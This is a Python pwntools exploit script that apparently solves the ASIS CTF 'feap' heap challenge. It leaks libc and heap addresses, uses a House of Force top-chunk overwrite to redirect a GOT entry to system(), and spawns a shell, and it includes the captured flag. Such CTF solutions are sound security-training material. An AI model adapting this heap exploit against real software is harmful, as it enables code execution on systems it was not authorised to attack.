#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

#host = "10.211.55.23"
#port = 8888
host = "feap.asis-ctf.ir"
port = 7331

# ASIS{H34P_0V3R_Fl0W_533M5_T0_B3_ST1LL_FR3SH_*}

r = remote(host,port)

def calc_force(targetaddr,topaddr,bits=64):
    if bits == 32:
        nb = targetaddr - 4 - topaddr - 0x8
    else :
        nb = targetaddr - 8 - topaddr - 0x10
    return nb

def create(size,title,body):
    r.recvuntil(">")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(title)
    r.recvuntil(":")
    r.sendline(body)

def remove(idx):
    r.recvuntil(">")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))

def printnote(idx):
    r.recvuntil(">")
    r.sendline("5")
    r.recvuntil(":")
    r.sendline(str(idx))
    data = r.recvuntil("-----***-----")
    return data

def edit(idx,choice,data):
    r.recvuntil(">")
    r.sendline("3")
    r.recvuntil(":")
    if choice == 1 :
        r.sendline("1")
    else :
        r.sendline("2")
    r.recvuntil(":")
    r.sendline(data)

setvbufgot = 0x602068
create(0x20,p64(setvbufgot),"ddaa")
data = printnote(44)
setvbuf =  u64(data.split()[3].ljust(8,"\x00"))
heapbase =  u64(data.split()[5].ljust(8,"\x00")) - 0x10
#libcbase = setvbuf - 0x711d0
libcbase = setvbuf - 0x70670

print "heapbase: " , hex(heapbase)
print "libcbase: " , hex(libcbase)
raw_input()
create(-64,p64(0)*3 + "\xff"*8,"")
top = heapbase + 0x1f0
nb = calc_force(0x602010,top)
nb -= 64
create(nb,"/bin/sh","")

system = libcbase + 0x46640
puts = libcbase + 0x6fe30
#system = libcbase + 0x443d0
#puts = libcbase + 0x709d0 
create(100,"a"*8 + p64(system) + p64(puts),"")
remove(2)
r.interactive()
